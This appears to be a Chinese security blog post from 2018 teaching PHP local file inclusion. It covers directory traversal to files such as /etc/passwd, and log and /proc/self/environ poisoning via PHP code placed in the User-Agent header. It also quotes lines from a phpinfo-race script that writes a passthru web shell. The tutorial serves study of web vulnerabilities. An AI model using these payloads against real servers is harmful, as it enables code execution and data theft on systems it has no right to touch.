@@ -1,0 +1,1319 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,文件包含,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件包含漏洞 &amp;lt;http://www.cnblogs.com/iamstudy/articles/include_file.html&amp;gt; &amp;lt;http://www.cnblogs.com/littlehann/p/3665062.html&amp;gt;  01-简述&amp;amp;原理 如果允许客户端用户输入控制动态包含在服务器端的文件  导致后果： 恶意代码的执行； 敏感信息泄露">
+<meta name="keywords" content="Web安全,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://21guns.top/2018/01/22/文件包含漏洞/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="文件包含漏洞 &amp;lt;http://www.cnblogs.com/iamstudy/articles/include_file.html&amp;gt; &amp;lt;http://www.cnblogs.com/littlehann/p/3665062.html&amp;gt;  01-简述&amp;amp;原理 如果允许客户端用户输入控制动态包含在服务器端的文件  导致后果： 恶意代码的执行； 敏感信息泄露">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/44295054.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/49003385.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/52787063.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/37057782.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/20373813.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/84845701.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/50980359.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/43602449.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/82649660.jpg">
+<meta property="og:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-20/88684423.jpg">
+<meta property="og:updated_time" content="2019-02-18T07:39:32.602Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件包含漏洞">
+<meta name="twitter:description" content="文件包含漏洞 &amp;lt;http://www.cnblogs.com/iamstudy/articles/include_file.html&amp;gt; &amp;lt;http://www.cnblogs.com/littlehann/p/3665062.html&amp;gt;  01-简述&amp;amp;原理 如果允许客户端用户输入控制动态包含在服务器端的文件  导致后果： 恶意代码的执行； 敏感信息泄露">
+<meta name="twitter:image" content="http://ot12pfxkm.bkt.clouddn.com/18-1-21/44295054.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/文件包含漏洞/">
+
+
+
+
+
+  <title>文件包含漏洞 | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:09:15+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><blockquote>
+<p><code>&lt;http://www.cnblogs.com/iamstudy/articles/include_file.html&gt;</code></p>
+<p><code>&lt;http://www.cnblogs.com/littlehann/p/3665062.html&gt;</code></p>
+</blockquote>
+<h2 id="01-简述-amp-原理"><a href="#01-简述-amp-原理" class="headerlink" title="01-简述&amp;原理"></a>01-简述&amp;原理</h2><ul>
+<li><p>如果允许客户端用户输入控制动态包含在服务器端的文件</p>
+<ul>
+<li>导致后果：</li>
+<li>恶意代码的执行；</li>
+<li>敏感信息泄露</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>主要包括</p>
+<ul>
+<li>本地文件包含</li>
+<li>远程文件包含</li>
+</ul>
+</li>
+<li><p>常见包含函数有</p>
+<ul>
+<li>include()</li>
+<li>require()</li>
+</ul>
+</li>
+<li><p>各函数区别</p>
+<ul>
+<li>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</li>
+<li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li>
+<li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
+<li>require一般是用于文件头包含类文件、数据库等等文件；</li>
+<li>include一般是用于包含html模版文件；</li>
+</ul>
+</li>
+<li><p>基本代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $file;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="02-本地包含"><a href="#02-本地包含" class="headerlink" title="02-本地包含"></a>02-本地包含</h2><h3 id="2-1-包含目录文件"><a href="#2-1-包含目录文件" class="headerlink" title="2.1-包含目录文件"></a>2.1-包含目录文件</h3><h4 id="2-1-1-代码执行或文件内容泄露"><a href="#2-1-1-代码执行或文件内容泄露" class="headerlink" title="2.1.1-代码执行或文件内容泄露"></a>2.1.1-代码执行或文件内容泄露</h4><ul>
+<li><code>index.php?f=test.txt</code></li>
+<li>如果里面的内容是php格式（尽管后缀不是php）<ul>
+<li>则内容会被当成php执行</li>
+</ul>
+</li>
+<li>不是php<ul>
+<li>则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-1-2-目录遍历"><a href="#2-1-2-目录遍历" class="headerlink" title="2.1.2-目录遍历"></a>2.1.2-目录遍历</h4><ul>
+<li><p><code>index.php?f=./../../test.txt</code>（./当前目录,../上一级目录,这样的遍历目录来读取文件）</p>
+</li>
+<li><p>测试了四个文件，不同目录下的222.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当前目录</span><br><span class="line">E:\Office\phpStudy\www\test</span><br><span class="line">?f=./222.txt</span><br><span class="line"></span><br><span class="line">当前目录的某下一级</span><br><span class="line">E:\Office\phpStudy\www\\test\tmp?f=./tmp/222.txt</span><br><span class="line"></span><br><span class="line">上层目录</span><br><span class="line">E:\Office\phpStudy\www?f=./../222.txt</span><br><span class="line"></span><br><span class="line">上上层目录</span><br><span class="line">E:\Office\phpStudy?f=./../../222.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意</p>
+<ul>
+<li><p>上述4个，可以不加./，默认会有，最好加，便于观察</p>
+</li>
+<li><p>加几个../的问题</p>
+<ul>
+<li>当前目录 和 所包含文件目录 中 ‘/‘ 的个数</li>
+<li>如：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">E:\Office\phpStudy\www\test\index.php </span><br><span class="line">当前目录为test；</span><br><span class="line">E:\Office\phpStudy\222.txt；</span><br><span class="line">222.txt所在目录为phpstudy；</span><br><span class="line">共有两个\，需要两个../；</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-1-3-其它"><a href="#2-1-3-其它" class="headerlink" title="2.1.3-其它"></a>2.1.3-其它</h4><ul>
+<li>实例：<ul>
+<li>本地乌云漏洞库搜索；</li>
+</ul>
+</li>
+<li>文件读取漏洞路径收集：<ul>
+<li><code>&lt;https://3wapp.github.io/WebSecurity/path_collect.html&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2-包含日志文件"><a href="#2-2-包含日志文件" class="headerlink" title="2.2-包含日志文件"></a>2.2-包含日志文件</h3><h4 id="2-2-0简介"><a href="#2-2-0简介" class="headerlink" title="2.2.0简介"></a>2.2.0简介</h4><ul>
+<li><p>包含access log、error log。</p>
+</li>
+<li><p>需要知道log文件的路径</p>
+<ul>
+<li>可以先读一下nginx、apache默认的配置文件位置</li>
+<li>例如/usr/local/nginx/conf/nginx.conf、/etc/httpd/conf/httpd.conf等等</li>
+</ul>
+</li>
+<li><p>需要有权限</p>
+<ul>
+<li><p>如果apache是通过yum安装的话，那么默认log文件的位置是/var/log/httpd/</p>
+</li>
+<li><p>我们首先包含<a href="http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log" target="_blank" rel="noopener">http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log</a></p>
+</li>
+<li><p>发现返回界面为空，可能权限不够，我们来看一下权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@vincent log]# ls -ld httpd/</span><br><span class="line">drwx——. 2 root root 4096 8月  15 04:08 httpd/</span><br><span class="line">[root@vincent httpd]# ll access_log</span><br><span class="line">-rw-r–r– 1 root root 2562 8月  15 07:41 access_log</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里因为httpd目录的other权限为0，所有apache的默认启动账户apache是无法进入这个目录的，我们为了测试修改一下权限。</p>
+<p><code>[root@vincent log]# chmod 701 httpd/</code></p>
+</li>
+<li><p>然后访问<a href="http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log发现可以包含到access_log了" target="_blank" rel="noopener">http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log发现可以包含到access_log了</a></p>
+</li>
+</ul>
+</li>
+<li><p>我们将UA修改为&lt;?php phpinfo();?&gt;就可以了。另外可以直接写到参数中，不过因为使用Firefox提交172.16.100.168:8080/post.php?file=&lt;?php phpinfo();?&gt;的话记录到日志的内容会将尖括号和空格进行URL编码，所以使用BURP提交。</p>
+</li>
+<li><p>但是如果access log文件太大，基本无法包含成功，可以尝试包含error log，error log一般小一些。</p>
+</li>
+<li><p>我们随便访问一个不存在的路径，然后增加个referer:&lt;?php phpinfo();?&gt;就可以了，来看下error_log</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Mon Aug 15 08:19:40 2016] [error] [client 172.16.100.1] File does not exist: /var/www/html/12324324, referer: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件    (错误、访问文件都行)。</li>
+</ul>
+</li>
+<li><p>注意：</p>
+<ul>
+<li>日志文件通常很大，文件包含时可能导致浏览器卡死；</li>
+<li>选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-2-1-日志文件分析（访问日志和错误日志）"><a href="#2-2-1-日志文件分析（访问日志和错误日志）" class="headerlink" title="2.2.1-日志文件分析（访问日志和错误日志）"></a>2.2.1-日志文件分析（访问日志和错误日志）</h4><blockquote>
+<p><a href="http://www.jb51.net/article/47714.htm" target="_blank" rel="noopener">http://www.jb51.net/article/47714.htm</a><br><a href="http://www.blogdaren.com/m/?post=1129（错误日志详解）" target="_blank" rel="noopener">http://www.blogdaren.com/m/?post=1129（错误日志详解）</a></p>
+</blockquote>
+<ul>
+<li><p>apache的配置文件httpd.conf关于日志文件的配置</p>
+</li>
+<li><p>访问日志</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/44295054.jpg" alt></p>
+<ul>
+<li><p><code>#CustomLog &quot;logs/access.log&quot; common</code></p>
+</li>
+<li><p>日志记录有7个字段，如</p>
+<p><code>127.0.0.1 - - [01/Aug/2017:20:24:19 +0800] &quot;GET /test/1.php?f=222.txt HTTP/1.1&quot; 200 38</code></p>
+</li>
+<li><p><code>#CustomLog &quot;logs/access.log&quot; combined</code></p>
+<p>有9个字段，多了referer和User-Agent字段；</p>
+</li>
+</ul>
+</li>
+<li><p>错误日志</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/49003385.jpg" alt></p>
+</li>
+</ul>
+<h4 id="2-2-2-表示错误日志的位置和错误日志等级"><a href="#2-2-2-表示错误日志的位置和错误日志等级" class="headerlink" title="2.2.2-表示错误日志的位置和错误日志等级"></a>2.2.2-表示错误日志的位置和错误日志等级</h4><blockquote>
+<p>详情百度</p>
+</blockquote>
+<h4 id="2-2-3-测试1（访问文件处写入）"><a href="#2-2-3-测试1（访问文件处写入）" class="headerlink" title="2.2.3-测试1（访问文件处写入）"></a>2.2.3-测试1（访问文件处写入）</h4><ul>
+<li><p>访问  <code>http://127.0.0.1/test/1.php?f=222.txt&lt;?php%20phpinfo();?&gt;</code></p>
+</li>
+<li><p>日志文件会增加一条 记录：</p>
+<p><code>127.0.0.1 - - [01/Aug/2017:20:31:44 +0800] &quot;GET /test/1.php?f=222.txt%3C?php%20phpinfo();?%3E HTTP/1.1&quot; 200 29</code></p>
+</li>
+<li><p>注意，在这特殊字符被url编码；浏览器的锅。</p>
+</li>
+<li><p>测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">日志文件所在目录：</span><br><span class="line">E:\Office\phpStudy\Apache\logs</span><br><span class="line">当前目录：</span><br><span class="line">E:\Office\phpStudy\WWW\test</span><br><span class="line">因此包含时：</span><br><span class="line">?f=../../Apache/logs/access.log</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>但是最终因&lt;&gt;被url编码没有成功；</p>
+<p>（特殊字符被浏览器自动编码，浏览器的锅，burp发包即可解决；尖括号和空格都会编码；）</p>
+</li>
+<li></li>
+</ul>
+<h4 id="2-2-4-测试2（UA头写入）"><a href="#2-2-4-测试2（UA头写入）" class="headerlink" title="2.2.4-测试2（UA头写入）"></a>2.2.4-测试2（UA头写入）</h4><ul>
+<li><p>更改apache配置文件httpd.conf，访问日志设置为    </p>
+<p><code>CustomLog &quot;logs/access.log&quot; combined</code></p>
+</li>
+<li><p>使每条日志记录有9个字段，如：</p>
+<p><code>127.0.0.1 - - [02/Aug/2017:09:38:11 +0800] &quot;GET /test/1.php HTTP/1.1&quot; 200 113 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</code>（最后一个字段为ua头）</p>
+</li>
+<li><p>burp发包：</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/52787063.jpg" alt></p>
+</li>
+<li><p>日志记录</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/37057782.jpg" alt></p>
+</li>
+<li><p>效果</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/20373813.jpg" alt></p>
+</li>
+</ul>
+<h4 id="2-2-5-测试3（包含错误日志）"><a href="#2-2-5-测试3（包含错误日志）" class="headerlink" title="2.2.5-测试3（包含错误日志）"></a>2.2.5-测试3（包含错误日志）</h4><ul>
+<li>httpd.conf将LogLevel 改为warn（ debug, info, notice, warn, error, crit,alert, emerg），记录大于等于此等级的</li>
+<li>同测试1差不多，前者包含访问日志，后者包含错误日志，都是在访问文件出写入payload；</li>
+<li>此外，除了访问文件处，如何构造错误请求，使其记录在错误日志？？？</li>
+</ul>
+<h4 id="2-2-6-测试4（包含apache配置文件）"><a href="#2-2-6-测试4（包含apache配置文件）" class="headerlink" title="2.2.6-测试4（包含apache配置文件）"></a>2.2.6-测试4（包含apache配置文件）</h4><ul>
+<li><p>包含配置文件，httpd.conf，读出其内容，可得到日志存储路径等信息</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/84845701.jpg" alt></p>
+</li>
+</ul>
+<h4 id="2-2-7-其它"><a href="#2-2-7-其它" class="headerlink" title="2.2.7-其它"></a>2.2.7-其它</h4><ul>
+<li>常见几个路径<ul>
+<li>/var/log/apache/access_log</li>
+<li>/var/www/logs/access_log</li>
+<li>/var/log/access_log</li>
+<li>更多见上面的路径收集</li>
+</ul>
+</li>
+<li>包含本地文件的关键便是得到文件的物理路径；<br><code>https://3wapp.github.io/WebSecurity/path_collect.html</code></li>
+</ul>
+<h3 id="2-3-包含其它"><a href="#2-3-包含其它" class="headerlink" title="2.3-包含其它"></a>2.3-包含其它</h3><h4 id="2-3-1-包含系统环境"><a href="#2-3-1-包含系统环境" class="headerlink" title="2.3.1-包含系统环境"></a>2.3.1-包含系统环境</h4><ul>
+<li><p>简介</p>
+<ul>
+<li>linux(FreeBSD是没有这个的)下的/proc/self/environ。</li>
+<li>要求是php运行早cgi上面(具体没测试)…然后和包含日志一样,在User-agent修改成payload.</li>
+<li>这个环境变量有访问web的session信息和包含user-agent的参数。user-agent在客户端是可以修改的</li>
+</ul>
+</li>
+<li><p>检查proc/self/environ是否可用访问</p>
+<ul>
+<li><p>提交url:<a href="http://www.website.com/view.php?page=../../../../../proc/self/environ" target="_blank" rel="noopener">www.website.com/view.php?page=../../../../../proc/self/environ</a></p>
+</li>
+<li><p>如果看到类似如下信息:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOCUMENT_ROOT=/home/sirgod/public_html GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1 HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac HTTP_HOST=www.website.com HTTP_REFERER=http://www.website.com/index.php?view=../../../../../../etc/passwd HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 PATH=/bin:/usr/bin QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx REMOTE_PORT=35665 REQUEST_METHOD=GET REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron SCRIPT_FILENAME=/home/sirgod/public_html/index.php SCRIPT_NAME=/index.php SERVER_ADDR=1xx.1xx.1xx.6x SERVER_ADMIN=webmaster@website.com SERVER_NAME=www.website.com SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.0 SERVER_SIGNATURE=</span><br><span class="line">Apache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2 mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at www.website.com Port 80</span><br></pre></td></tr></table></figure>
+<ul>
+<li>说明是可以访问的；</li>
+</ul>
+</li>
+<li><p>如果返回时个空白页</p>
+<ul>
+<li>说明是无法访问的</li>
+<li>也可能操作系统是FreeBSD</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ua头中添加payload</p>
+<ul>
+<li>包含/proc/self/environ文件(linux下)，需要向User-Agent头添加代码：</li>
+<li>然后再访问一下该站点，则代码就被写入/proc/self/environ中了，再包含/proc/self/envirson即可：</li>
+<li>这个用法需要一定的权限，真的很鸡肋，apache用户都是root权限了，还是无法包含。</li>
+</ul>
+</li>
+<li><p>3 利用/proc/self/environ目录遍历及远程执行代码的漏洞</p>
+<ul>
+<li><p><code>http://pnig0s1992.blog.51cto.com/393390/400182</code></p>
+</li>
+<li><p>Exploiting LFI to RCE /proc/self/environ with burpsuite:</p>
+<p><code>https://youtu.be/dlh0ogYy9ys</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-3-2-包含session文件"><a href="#2-3-2-包含session文件" class="headerlink" title="2.3.2-包含session文件"></a>2.3.2-包含session文件</h4><ul>
+<li>php保存格式——sess_SESSIONID </li>
+<li>默认位置是<ul>
+<li>/tmp/(PHP Sessions)、</li>
+<li>/var/lib/php/session/(PHP Sessions)、</li>
+<li>/var/lib/php5/(PHP Sessions) </li>
+<li>和c:/windows/temp/(PHP Sessions)等文件中。</li>
+</ul>
+</li>
+<li>需要在session文件中有可控的部分。</li>
+<li>session文件一般在/tmp目录下，格式为sess_[phpsessid],</li>
+</ul>
+<h4 id="2-3-3-包含由其它php创建的tmp文件"><a href="#2-3-3-包含由其它php创建的tmp文件" class="headerlink" title="2.3.3-包含由其它php创建的tmp文件"></a>2.3.3-包含由其它php创建的tmp文件</h4><ul>
+<li><p>利用LFI和phpinfo getshell<br>利用条件：</p>
+<ul>
+<li>需要知道phpinfo路径；</li>
+<li>网站存在文件包含漏洞；</li>
+<li>需要有Web目录的写入权限</li>
+</ul>
+</li>
+<li><p>我们知道在向服务器上任意php文件post请求上传数据时，都会生成临时文件，我们可以在临时文件删除之前包含临时文件来生成Webshell，可以phpinfo页面找到临时文件的路径及名字。</p>
+</li>
+<li><p>利用脚本如下：</p>
+<ul>
+<li><p><a href="https://github.com/hxer/vulnapp/blob/master/lfi_phpinfo/poc/lfi_phpinfo.py" target="_blank" rel="noopener">https://github.com/hxer/vulnapp/blob/master/lfi_phpinfo/poc/lfi_phpinfo.py</a></p>
+</li>
+<li><p>需要修改三处：</p>
+<ul>
+<li>Webshell的位置<br><code>payload += &#39;&lt;?php $c=fopen(&quot;./shell.php&quot;, &quot;w&quot;);fwrite($c, \&#39;&lt;?php passthru($_GET[“f”]);?&gt;\&#39;);?&gt;&#39;</code><br>这里生成在当前目录下</li>
+<li>phpinfo文件的位置<br><code>req = &#39;POST {path}/phpinfo.php?a={padding} HTTP/1.1\r\n&#39;.format(path=php_path, padding=padding)</code></li>
+<li>文件包含文件的位置<br><code>lfi_req = &#39;GET {path}/post.php?file=%s HTTP/1.1\r\n&#39;.format(path=php_path)</code></li>
+</ul>
+</li>
+<li><p>然后执行Python文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vincent tmp]# python lfi.py 127.0.0.1 -p 8080</span><br><span class="line">LFI with phpinfo()</span><br><span class="line">==============================</span><br><span class="line">INFO:__main__:Getting initial offset …</span><br><span class="line">INFO:__main__:found [tmp_name] at 162448</span><br><span class="line">INFO:__main__:</span><br><span class="line">Got it! Shell created in /tmp/g</span><br><span class="line">INFO:__main__:Wowo! \m/</span><br><span class="line">INFO:__main__:Shutting down…</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后看一下生成<br><code>[root@vincent tmp]# cat /var/www/html/shell.php</code></p>
+</li>
+</ul>
+</li>
+<li><p>上传一个文件的过程,可以在tmp那里包含：</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/50980359.jpg" alt></p>
+</li>
+<li><p>本地测试</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-21/43602449.jpg" alt></p>
+</li>
+<li><p>链家旗下自如某站一个有意思的文件包含到简单内网渗透（本地文件包含getshell技巧）：<br><code>http://www.wooyun.org/bugs/wooyun-2015-0134185</code></p>
+</li>
+</ul>
